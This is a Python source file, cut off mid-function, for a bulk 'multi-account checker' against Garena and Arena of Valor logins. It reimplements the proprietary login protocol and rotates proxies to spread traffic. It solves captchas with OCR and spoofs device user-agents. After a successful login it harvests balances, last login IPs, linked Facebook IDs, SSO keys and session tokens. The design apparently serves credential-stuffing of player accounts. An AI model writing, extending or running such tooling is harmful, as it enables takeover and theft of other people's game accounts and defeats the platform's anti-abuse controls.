"""
AOV Engine - Core Engine for Garena & Arena of Valor (Lien Quan Mobile).
Contains the Garena protocol/login implementation and unified result formatting.
"""
import base64
import ctypes
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
import datetime
import hashlib
from io import BytesIO
import os
import random
import re
import socket
import struct
import sys
import threading
import time
import unicodedata
from urllib.parse import quote_plus
import uuid

import requests
import urllib3

urllib3.disable_warnings()

# Optional libraries with graceful fallback
try:
    import cv2
    import numpy as np
except ImportError:
    cv2 = None
    np = None

try:
    from PIL import Image, ImageFilter
except ImportError:
    Image = None
    ImageFilter = None

try:
    import ddddocr
except ImportError:
    ddddocr = None

# Configure UTF-8 encoding on Windows console
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    # Foreground
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    # Background
    BG_GREEN = "\033[42m"
    BG_RED = "\033[41m"
    BG_YELLOW = "\033[43m"
    BG_BLUE = "\033[44m"
    BG_CYAN = "\033[46m"


def _enable_ansi():
    """Enable ANSI escape codes on Windows console."""
    if sys.platform == "win32":
        try:
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_ansi()


def _c(color: str, text: str) -> str:
    """Wrap text in ANSI color (noop if not a tty)."""
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{C.RESET}"


def _print_banner():
    banner = (
        _c(C.CYAN + C.BOLD, "=" * 62) + "\n" +
        _c(C.YELLOW + C.BOLD, "       GARENA & AOV MULTI-ACCOUNT CHECKER TOOL        ".center(62)) + "\n" +
        _c(C.CYAN + C.BOLD, "=" * 62)
    )
    print(banner)


# ── Server & Protocol Constants ──────────────────────────────────────────────
HOST = "mconnect.gxx.garenanow.com"
PORT = 19000

CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION = 283
CLIENT_TYPE = 4352
PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
CLIENT_ID_MASK = 4354

CMD_LOGIN_PREPARE = 256
CMD_LOGIN = 257
CMD_LOGIN_INFO_GET = 276
CMD_SESSION_TOKEN_GET = 278
CMD_USER_BASIC_INFO_LIST_GET = 289
CMD_USER_ACCOUNT_INFO_GET = 342
CMD_SSO_KEY_GET = 442
CMD_APP_OAUTH_LOGIN = 439
CMD_FB_USER_INFO_GET = 467
CMD_C2S_REQUEST = 2

LIEN_QUAN_APP_ID = 100054
ROV_TH_APP_ID = 100055
FC_MOBILE_VN_APP_ID = 100155
DF_GARENA_CLIENT_ID = 100151

# ── Global State & Concurrency ────────────────────────────────────────────────
_HOST_IP = "103.247.205.14"
_HOST_IP_lock = threading.Lock()

_HTTP_POOL = None
_HTTP_POOL_LOCK = threading.Lock()

_proxy_list = []  # list of (ip, port, user, pw) or (ip, port, None, None)
_proxy_idx = 0
_proxy_lock = threading.Lock()
_proxy_type_cache = {}  # (ip, port) -> 'socks5' | 'http'
_proxy_type_lock = threading.Lock()

_save_lock = threading.Lock()
_print_lock = threading.Lock()
_QUIET_BULK = False

_MAX_CONN = 100
_conn_sem = threading.Semaphore(_MAX_CONN)

_ocr_cache = {}
_ocr_lock = threading.Lock()

_pkt_counter = random.randint(0, 0x3FFFFF)


def _next_id() -> int:
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter


def _ensure_http_pool():
    global _HTTP_POOL
    if _HTTP_POOL is not None:
        return _HTTP_POOL
    with _HTTP_POOL_LOCK:
        if _HTTP_POOL is None:
            _HTTP_POOL = ThreadPoolExecutor(max_workers=500, thread_name_prefix="fc_http")
    return _HTTP_POOL


# ── Socket & Connection Helpers ───────────────────────────────────────────────
def _resolve_host_ip(timeout: float = 0.8) -> str:
    """Resolve HOST to a connectable IP. Fast-probes known IP pool first, then DNS fallback."""
    global _HOST_IP
    if _HOST_IP:
        return _HOST_IP
    with _HOST_IP_lock:
        if _HOST_IP:
            return _HOST_IP

        known_pool = ["103.247.205.14", "103.247.205.15", "103.247.205.16", "103.247.205.17", "103.247.205.18"]
        for ip in known_pool:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, PORT))
                s.close()
                _HOST_IP = ip
                return ip
            except Exception:
                continue

        candidate_ips = []
        try:
            infos = socket.getaddrinfo(HOST, PORT, socket.AF_INET, socket.SOCK_STREAM)
            for info in infos:
                ip = info[4][0]
                if ip not in candidate_ips:
                    candidate_ips.append(ip)
        except Exception:
            pass

        for ip in candidate_ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, PORT))
                s.close()
                _HOST_IP = ip
                return ip
            except Exception:
                continue

        _HOST_IP = "103.247.205.14"
        return _HOST_IP

        try:
            _HOST_IP = socket.gethostbyname(HOST)
        except Exception:
            _HOST_IP = HOST
        return _HOST_IP


def _make_fast_socket(timeout: int = 20):
    """Create a TCP socket optimized for speed and fast close."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(timeout)
    return sock


# ── Proxy Management ──────────────────────────────────────────────────────────
def load_proxies(filepath: str):
    """Load proxies from file. Formats: ip:port:user:pass or ip:port"""
    global _proxy_list
    proxies = []
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) >= 4:
                proxies.append((parts[0], int(parts[1]), parts[2], parts[3]))
            elif len(parts) >= 2:
                proxies.append((parts[0], int(parts[1]), None, None))
    _proxy_list = proxies


def _test_proxy(proxy, timeout: int = 6) -> str:
    """Quick test a proxy. Returns 'socks5', 'http', or raises exception."""
    ip, port, user, pw = proxy
    # Test SOCKS5
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b"\x05\x01\x00")
        resp = s.recv(2)
        s.close()
        if len(resp) == 2 and resp[0] == 5 and resp[1] in (0, 2):
            return "socks5"
    except Exception:
        pass
    # Test HTTP CONNECT
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b"CONNECT 1.1.1.1:80 HTTP/1.1\r\nHost: 1.1.1.1:80\r\n\r\n")
        resp = s.recv(32)
        s.close()
        if b"HTTP" in resp or b"200" in resp or b"407" in resp:
            return "http"
    except Exception:
        pass
    raise ConnectionError(f"Proxy {ip}:{port} không phản hồi (dead/cần auth)")


def validate_proxies(print_fn=print) -> int:
    """Test all loaded proxies, remove dead ones. Returns count of live proxies."""
    global _proxy_list
    if not _proxy_list:
        return 0
    live = []
    dead = 0
    for proxy in _proxy_list:
        ip, port = proxy[0], proxy[1]
        try:
            ptype = _test_proxy(proxy, timeout=5)
            with _proxy_type_lock:
                _proxy_type_cache[(ip, port)] = ptype
            live.append(proxy)
        except Exception:
            dead += 1
    _proxy_list = live
    if dead:
        print_fn(_c(C.RED, f"  [!] {dead} proxy chết/không phản hồi đã bị loại bỏ."))
    if not live:
        print_fn(_c(C.RED, "  [!!] Không có proxy nào hoạt động! Checker sẽ dùng kết nối trực tiếp."))
    else:
        print_fn(_c(C.GREEN, f"  [✓] {len(live)} proxy hoạt động."))
    return len(live)


def _next_proxy():
    """Round-robin proxy selection (thread-safe)."""
    global _proxy_idx
    if not _proxy_list:
        return None
    with _proxy_lock:
        p = _proxy_list[_proxy_idx % len(_proxy_list)]
        _proxy_idx += 1
    return p


def _get_http_proxies(proxy):
    """Build requests proxies dict from proxy tuple."""
    if not proxy:
        return None
    ip, port, user, pw = proxy
    ptype = _proxy_type_cache.get((ip, port), "socks5")
    if ptype == "socks5":
        url = f"socks5://{user}:{pw}@{ip}:{port}" if (user and pw) else f"socks5://{ip}:{port}"
    else:
        url = f"http://{user}:{pw}@{ip}:{port}" if (user and pw) else f"http://{ip}:{port}"
    return {"http": url, "https": url}


def _connect_via_socks5(sock, dest_host: str, dest_port: int, user=None, pw=None):
    """Perform SOCKS5 handshake on an already-connected socket."""
    if user and pw:
        sock.sendall(b"\x05\x02\x00\x02")
    else:
        sock.sendall(b"\x05\x01\x00")

    resp = b""
    while len(resp) < 2:
        chunk = sock.recv(2)
        if not chunk:
            raise ConnectionError("SOCKS5 proxy closed during greeting")
        resp += chunk
    if resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid version: {resp[0]}")
    method = resp[1]
    if method == 0xFF:
        raise ConnectionError("SOCKS5 no acceptable auth method")

    if method == 2:
        if not (user and pw):
            raise ConnectionError("SOCKS5 proxy requires auth but no credentials provided")
        u = user.encode("utf-8")
        p = pw.encode("utf-8")
        auth_req = bytes([1, len(u)]) + u + bytes([len(p)]) + p
        sock.sendall(auth_req)
        auth_resp = b""
        while len(auth_resp) < 2:
            chunk = sock.recv(2)
            if not chunk:
                raise ConnectionError("SOCKS5 proxy closed during auth")
            auth_resp += chunk
        if auth_resp[1] != 0:
            raise ConnectionError(f"SOCKS5 auth failed: status={auth_resp[1]}")
    elif method != 0:
        raise ConnectionError(f"SOCKS5 unsupported method: {method}")

    host_enc = dest_host.encode("utf-8")
    req = (
        b"\x05\x01\x00\x03" +
        bytes([len(host_enc)]) + host_enc +
        struct.pack(">H", dest_port)
    )
    sock.sendall(req)

    conn_resp = b""
    while len(conn_resp) < 10:
        chunk = sock.recv(10)
        if not chunk:
            raise ConnectionError("SOCKS5 proxy closed during connect")
        conn_resp += chunk
    if conn_resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid response version: {conn_resp[0]}")
    if conn_resp[1] != 0:
        socks5_errors = {
            1: "general failure", 2: "connection not allowed", 3: "network unreachable",
            4: "host unreachable", 5: "connection refused", 6: "TTL expired",
            7: "command not supported", 8: "address type not supported",
        }
        raise ConnectionError(f"SOCKS5 connect error: {socks5_errors.get(conn_resp[1], conn_resp[1])}")


def _connect_via_proxy(proxy, dest_host: str, dest_port: int, timeout: int = 20):
    """Create a TCP socket tunneled through a proxy (auto-detects SOCKS5 vs HTTP)."""
    ip, port, user, pw = proxy
    key = (ip, port)
    cached_type = _proxy_type_cache.get(key)

    def _try_socks5():
        s = _make_fast_socket(timeout)
        s.connect((ip, port))
        _connect_via_socks5(s, dest_host, dest_port, user, pw)
        return s

    def _try_http_connect():
        s = _make_fast_socket(timeout)
        s.connect((ip, port))
        connect_line = f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\nHost: {dest_host}:{dest_port}\r\n"
        if user and pw:
            cred = base64.b64encode(f"{user}:{pw}".encode()).decode()
            connect_line += f"Proxy-Authorization: Basic {cred}\r\n"
        connect_line += "\r\n"
        s.sendall(connect_line.encode())
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = s.recv(4096)
            if not chunk:
                raise ConnectionError("Proxy closed connection")
            resp += chunk
        status_line = resp.split(b"\r\n")[0].decode(errors="replace")
        if "200" not in status_line:
            s.close()
            raise ConnectionError(f"Proxy CONNECT failed: {status_line}")
        return s

    if cached_type == "socks5":
        return _try_socks5()
    if cached_type == "http":
        return _try_http_connect()

    try:
        s = _try_socks5()
        with _proxy_type_lock:
            _proxy_type_cache[key] = "socks5"
        return s
    except Exception:
        pass

    s = _try_http_connect()
    with _proxy_type_lock:
        _proxy_type_cache[key] = "http"
    return s


# ── XTEA-CBC & Wire Protocol ─────────────────────────────────────────────────
_XTEA_DELTA = 0x9E3779B9
_XTEA_ROUNDS = 32


def _mix(v: int) -> int:
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)


def _xtea_enc_block(v0: int, v1: int, key: bytes):
    k = struct.unpack("<4I", key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1


def _xtea_dec_block(v0: int, v1: int, key: bytes):
    k = struct.unpack("<4I", key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1


def xtea_encrypt(data: bytes, key: bytes) -> bytes:
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)

    R = struct.unpack("<Q", os.urandom(8))[0]
    R_bytes = struct.pack("<Q", R)
    enc_R = struct.pack("<2I", *_xtea_enc_block(*struct.unpack("<2I", R_bytes), key))

    prev = enc_R
    out = bytearray(enc_R)
    pt_sum = R
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i:i + 8]
        pt_sum = (pt_sum + struct.unpack("<Q", pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack("<2I", blk), key)
        prev = struct.pack("<2I", v0, v1)
        last_ct = prev
        out.extend(prev)

    last_ct_val = struct.unpack("<Q", last_ct)[0]
    check_input = last_ct_val ^ pt_sum
    check_bytes = struct.pack("<Q", check_input)
    check_enc = struct.pack("<2I", *_xtea_enc_block(*struct.unpack("<2I", check_bytes), key))
    out.extend(check_enc)
    return bytes(out)


def xtea_decrypt(data: bytes, key: bytes) -> bytes:
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv = data[:8]
    body = data[8:-8]
    out = bytearray()
    prev = iv
    for i in range(0, len(body), 8):
        blk = body[i:i + 8]
        v0, v1 = _xtea_dec_block(*struct.unpack("<2I", blk), key)
        plain = bytes(a ^ b for a, b in zip(struct.pack("<2I", v0, v1), prev))
        out.extend(plain)
        prev = blk

    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)


def _varint_enc(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)


def _pf_varint(tag: int, n: int) -> bytes:
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)


def _pf_bytes(tag: int, b: bytes) -> bytes:
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b


def _pf_str(tag: int, s: str) -> bytes:
    return _pf_bytes(tag, s.encode("utf-8"))


def _proto_decode(data: bytes) -> dict:
    fields = {}
    pos = 0
    while pos < len(data):
        try:
            key = 0
            shift = 0
            while True:
                b = data[pos]
                pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80):
                    break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = 0
                shift = 0
                while True:
                    b = data[pos]
                    pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80):
                        break
                    shift += 7
                fields[fn] = val
            elif wt == 2:
                ln = 0
                shift = 0
                while True:
                    b = data[pos]
                    pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80):
                        break
                    shift += 7
                fields[fn] = data[pos:pos + ln]
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields


def _build_frame(cmd: int, body: bytes) -> bytes:
    hdr = (
        _pf_varint(1, PACKET_VERSION) +
        _pf_varint(2, _next_id()) +
        _pf_varint(3, CMD_C2S_REQUEST) +
        _pf_varint(4, cmd) +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack(">H", len(hdr)) + hdr + body
    return struct.pack("<I", len(payload)) + payload


def _recvall(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection dropped")
        buf += chunk
    return buf


def _recv_frame(sock) -> tuple:
    size = struct.unpack("<I", _recvall(sock, 4))[0]
    payload = _recvall(sock, size)
    hdr_len = struct.unpack(">H", payload[:2])[0]
    hdr = _proto_decode(payload[2:2 + hdr_len])
    body = payload[2 + hdr_len:]
    return hdr, body


def _recv_cmd_frame(sock, target_cmd: int, max_tries: int = 5) -> tuple:
    last_hdr, last_body = {5: -1}, b""
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock)
        last_hdr, last_body = hdr, body
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return last_hdr, last_body


# ── Captcha & Authentication ──────────────────────────────────────────────────
def _account_type(account: str) -> int:
    if account.isdigit():
        return 3  # ACCOUNT_MOBILE
    if "@" in account:
        return 2  # ACCOUNT_EMAIL
    return 1      # ACCOUNT_USERNAME


def _build_login_prepare(account: str, rand_key: bytes, captcha_key: str = "", captcha: str = "") -> bytes:
    inner = (
        _pf_varint(1, 0) +
        _pf_varint(2, _account_type(account)) +
        _pf_str(3, account) +
        _pf_varint(4, CLIENT_TYPE) +
        _pf_varint(5, CLIENT_VERSION)
    )
    if captcha_key:
        inner += _pf_str(7, captcha_key)
    if captcha:
        inner += _pf_str(8, captcha)

    enc = xtea_encrypt(inner, rand_key)
    return _pf_bytes(1, rand_key) + _pf_bytes(2, enc)


def _get_ocr(beta: bool = False):
    """Get or initialize cached ddddocr instance."""
    if ddddocr is None:
        return None
    key = "beta" if beta else "standard"
    if key not in _ocr_cache:
        with _ocr_lock:
            if key not in _ocr_cache:
                _ocr_cache[key] = ddddocr.DdddOcr(show_ad=False, beta=beta)
    return _ocr_cache[key]


def _solve_garena_captcha(proxy_dict=None):
    """Generate key, download image and solve using OCR ensemble."""
    if ddddocr is None:
        return "", ""

    captcha_key = str(uuid.uuid4()).replace("-", "")
    url = f"http://captcha.garena.com/image?key={captcha_key}"
    if not _QUIET_BULK:
        with _print_lock:
            print(_c(C.YELLOW, f"  [+] CAPTCHA URL: {url}"))

    try:
        resp = requests.get(url, proxies=proxy_dict, timeout=5, verify=False)
        if resp.status_code != 200:
            return "", ""

        content = resp.content

        if cv2 is not None and np is not None:
            try:
                nparr = np.frombuffer(content, np.uint8)
                img_color = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                img_color = cv2.resize(img_color, (0, 0), fx=3, fy=3, interpolation=cv2.INTER_CUBIC)
                img_gray = cv2.cvtColor(img_color, cv2.COLOR_BGR2GRAY)

                ocr = _get_ocr(beta=True)
                results = []

                # 1. Raw color
                _, buf1 = cv2.imencode(".png", img_color)
                r1 = ocr.classification(buf1.tobytes())
                results.append(re.sub(r"[^A-Z0-9]", "", r1.upper()))

                # 2. HSV mask for blue shades
                hsv = cv2.cvtColor(img_color, cv2.COLOR_BGR2HSV)
                mask = cv2.inRange(hsv, np.array([90, 50, 50]), np.array([130, 255, 255]))
                final2 = cv2.bitwise_not(mask)
                _, buf2 = cv2.imencode(".png", final2)
                r2 = ocr.classification(buf2.tobytes())
                results.append(re.sub(r"[^A-Z0-9]", "", r2.upper()))

                # 3. Adaptive Gaussian Threshold
                blur = cv2.GaussianBlur(img_gray, (3, 3), 0)
                thresh3 = cv2.adaptiveThreshold(
                    blur, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY_INV, 15, 6
                )
                final3 = cv2.bitwise_not(thresh3)
                _, buf3 = cv2.imencode(".png", final3)
                r3 = ocr.classification(buf3.tobytes())
                results.append(re.sub(r"[^A-Z0-9]", "", r3.upper()))

                # 4. Otsu Threshold
                _, thresh4 = cv2.threshold(img_gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)
                final4 = cv2.bitwise_not(thresh4)
                _, buf4 = cv2.imencode(".png", final4)
                r4 = ocr.classification(buf4.tobytes())
                results.append(re.sub(r"[^A-Z0-9]", "", r4.upper()))

                valid = [r for r in results if len(r) >= 5]
                res = Counter(valid or results).most_common(1)[0][0]
                return captcha_key, res
            except Exception:
                pass

        if Image is not None:
            try:
                img = Image.open(BytesIO(content)).convert("L")
                img = img.filter(ImageFilter.MedianFilter(size=3))
                img = img.point(lambda p: 0 if p < 140 else 255)
                buf = BytesIO()
                img.save(buf, format="PNG")
                content = buf.getvalue()
            except Exception:
                pass

        ocr = _get_ocr(beta=False)
        res = ocr.classification(content) if ocr else ""
        if res:
            res = re.sub(r"[^A-Z0-9]", "", res.upper())
        return captcha_key, res
    except Exception:
        pass
    return "", ""


def _derive_login_key(password: str, salt: str, verify_code: str):
    """Matches Garena login key derivation."""
    md5hex = hashlib.md5(password.encode("utf-8")).hexdigest()
    inner_raw = hashlib.sha256((md5hex + salt).encode("utf-8")).digest()
    inner_hex = inner_raw.hex()
    xtea_key = hashlib.sha256((inner_hex + verify_code).encode("utf-8")).digest()[:16]
    pw_hash = md5hex.encode("ascii")
    return xtea_key, pw_hash


def _http_login_garena(account: str, password: str, app_id: int = 100054,
                       proxy=None, timeout: int = 15) -> dict:
    """HTTP API login fallback - used when TCP triggers CAPTCHA (result=3)."""
    md5pw = hashlib.md5(password.encode("utf-8")).hexdigest()
    url = "https://sso.garena.com/api/login"
    ts_ms = int(time.time() * 1000)
    params = {
        "app_id": str(app_id),
        "account": account,
        "password": md5pw,
        "redirect_uri": "https://account.garena.com/",
        "format": "json",
        "id": str(ts_ms),
    }
    device_profiles = [
        "SM-S918B ;Android 13;vi;vn;",
        "SM-G998B ;Android 12;vi;vn;",
        "Pixel 7 ;Android 13;vi;vn;",
        "SM-A525F ;Android 12;vi;vn;",
        "RMX3370 ;Android 12;vi;vn;",
        "M2102J20SG ;Android 11;vi;vn;",
    ]
    ua_profile = random.choice(device_profiles)
    headers = {
        "User-Agent": f"GarenaMSDK/5.12.1({ua_profile})",
        "Accept": "application/json",
    }
    try:
        resp = requests.get(
            url, params=params, headers=headers,
            timeout=timeout, verify=False,
            proxies=_get_http_proxies(proxy),
            allow_redirects=False,
        )
        if resp.status_code in (301, 302):
            loc = resp.headers.get("Location", "")
            m = re.search(r"access_token=([^&]+)", loc)
            m_uid = re.search(r"open_id=([^&]+)", loc)
            if m:
                return {
                    "access_token": m.group(1),
                    "open_id": m_uid.group(1) if m_uid else "",
                    "_method": "http",
                }
        if resp.status_code == 200:
            try:
                data = resp.json()
                if "access_token" in data:
                    return {
                        "access_token": data["access_token"],
                        "open_id": str(data.get("open_id", "")),
                        "_method": "http",
                    }
                return {
                    "error": data.get("error_description", data.get("error", "unknown")),
                    "error_code": data.get("error", ""),
                }
            except Exception:
                pass
        return {"error": f"http_status={resp.status_code}"}
    except Exception as exc:
        return {"error": str(exc)}


def _build_login(account: str, password: str, salt: str, verify_code: str):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    user_status_bytes = _pf_varint(2, 4608)
    device_id = os.urandom(16)
    inner = (
        _pf_bytes(1, pw_hash) +
        _pf_varint(2, 0) +
        _pf_bytes(3, user_status_bytes) +
        _pf_bytes(4, device_id)
    )
    enc = xtea_encrypt(inner, xtea_key)
    return _pf_bytes(1, enc), xtea_key


def _build_enc_frame(cmd: int, body: bytes, session_key: bytes) -> bytes:
    hdr = (
        _pf_varint(1, PACKET_VERSION) +
        _pf_varint(2, _next_id()) +
        _pf_varint(3, CMD_C2S_REQUEST) +
        _pf_varint(4, cmd) +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack(">H", len(hdr)) + hdr + body
    enc_payload = xtea_encrypt(payload, session_key)
    return struct.pack("<I", len(enc_payload)) + enc_payload


def _recv_enc_frame(sock, session_key: bytes) -> tuple:
    size = struct.unpack("<I", _recvall(sock, 4))[0]
    enc_payload = _recvall(sock, size)
    payload = xtea_decrypt(enc_payload, session_key)
    hdr_len = struct.unpack(">H", payload[:2])[0]
    hdr = _proto_decode(payload[2:2 + hdr_len])
    body = payload[2 + hdr_len:]
    return hdr, body


def _send_cmd(sock, cmd: int, body: bytes, session_key: bytes, max_tries: int = 5) -> tuple:
    sock.sendall(_build_enc_frame(cmd, body, session_key))
    for _ in range(max_tries):
        hdr, resp_body = _recv_enc_frame(sock, session_key)
        if hdr.get(4, 0) == cmd:
            return hdr, resp_body
    return {5: -1}, b""


# ── Post-Login Information Fetchers ──────────────────────────────────────────
def _fetch_login_info(sock, session_key: bytes) -> dict:
    """CMD 276: region, shells, timestamps, FB UID, last-login IP."""
    try:
        hdr, body = _send_cmd(sock, CMD_LOGIN_INFO_GET, b"", session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 14 in fields:
            info["region"] = fields[14].decode("utf-8") if isinstance(fields[14], bytes) else str(fields[14])
        if 15 in fields:
            info["ccu"] = fields[15]
        if 13 in fields:
            acc = _proto_decode(fields[13]) if isinstance(fields[13], bytes) else {}
            if 1 in acc:
                info["shells"] = acc[1]
            if 2 in acc:
                info["topup_time"] = acc[2]
        if 4 in fields:
            info["created_time"] = fields[4]
        if 5 in fields:
            info["last_login"] = fields[5]
        if 2 in fields:
            info["session_expiry"] = fields[2]
        if 17 in fields:
            fb_proto = _proto_decode(fields[17]) if isinstance(fields[17], bytes) else {}
            if 1 in fb_proto:
                fb_uid_raw = fb_proto[1]
                info["fb_uid_login"] = fb_uid_raw.decode("utf-8") if isinstance(fb_uid_raw, bytes) else str(fb_uid_raw)
            if 2 in fb_proto:
                info["fb_link_time"] = fb_proto[2]
        if 18 in fields:
            s18 = _proto_decode(fields[18]) if isinstance(fields[18], bytes) else {}
            if 2 in s18:
                info["last_session_time"] = s18[2]
            if 3 in s18:
                ip_proto = _proto_decode(s18[3]) if isinstance(s18[3], bytes) else {}
                if 2 in ip_proto:
                    ip_raw = ip_proto[2]
                    info["last_session_ip"] = ip_raw.decode("utf-8") if isinstance(ip_raw, bytes) else str(ip_raw)
                if 3 in ip_proto:
                    cc_raw = ip_proto[3]
                    info["last_session_country"] = cc_raw.decode("utf-8") if isinstance(cc_raw, bytes) else str(cc_raw)
        return info
    except Exception:
        return {}


def _fetch_user_basic(sock, uid: int, session_key: bytes) -> dict:
    """CMD 289: username, nickname, avatar_id."""
    try:
        user_entry = _pf_varint(1, 0) + _pf_varint(2, uid)
        body = _pf_bytes(1, user_entry)
        hdr, resp = _send_cmd(sock, CMD_USER_BASIC_INFO_LIST_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        if 1 not in fields:
            return {}
        user_data = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
        info = {}
        if 2 in user_data:
            info["uid"] = user_data[2]
        if 3 in user_data:
            info["username"] = user_data[3].decode("utf-8") if isinstance(user_data[3], bytes) else str(user_data[3])
        if 4 in user_data:
            info["nickname"] = user_data[4].decode("utf-8") if isinstance(user_data[4], bytes) else str(user_data[4])
        return info
    except Exception:
        return {}


def _fetch_account_info(sock, session_key: bytes) -> dict:
    """CMD 342: password_set, email_verified, account_secured, mobile_bound."""
    try:
        hdr, body = _send_cmd(sock, CMD_USER_ACCOUNT_INFO_GET, b"", session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 4 in fields:
            info["password_set"] = bool(fields[4])
        if 5 in fields:
            info["email_verified"] = bool(fields[5])
        if 6 in fields:
            info["account_secured"] = bool(fields[6])
        if 7 in fields:
            info["mobile_bound"] = bool(fields[7])
        return info
    except Exception:
        return {}


def _fetch_sso_key(sock, session_key: bytes) -> dict:
    """CMD 442: SSO key for HTTP APIs."""
    try:
        hdr, body = _send_cmd(sock, CMD_SSO_KEY_GET, b"", session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 1 in fields:
            info["sso_key"] = fields[1].decode("utf-8") if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info["expiry"] = fields[2]
        return info
    except Exception:
        return {}


def _fetch_session_token(sock, session_key: bytes, app_id: int = 0) -> dict:
    """CMD 278: session token for HTTP APIs (app_id=0 for system token)."""
    try:
        body = b"" if app_id == 0 else _pf_varint(1, app_id)
        hdr, resp = _send_cmd(sock, CMD_SESSION_TOKEN_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info["session_token"] = fields[1].decode("utf-8") if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info["expiry"] = fields[2]
        return info
    except Exception:
        return {}


def _fetch_recent_games(session_token: str, proxy=None) -> dict:
    """HTTP: recent played games from GameAppService."""
    if not session_token:
        return {}
    try:
        url = f"https://garenaapp.garenanow.com/api/user/get_recent_games?session_key={session_token}"
        resp = requests.get(url, timeout=5, verify=False, proxies=_get_http_proxies(proxy))
        if resp.status_code == 200:
            data = resp.json()
            if "error" not in data:
                return data
    except Exception:
        pass
    return {}


def _fetch_fb_info(sock, session_key: bytes) -> dict:
    """CMD 467: Check if Facebook is linked."""
    try:
        body = _pf_str(1, "")
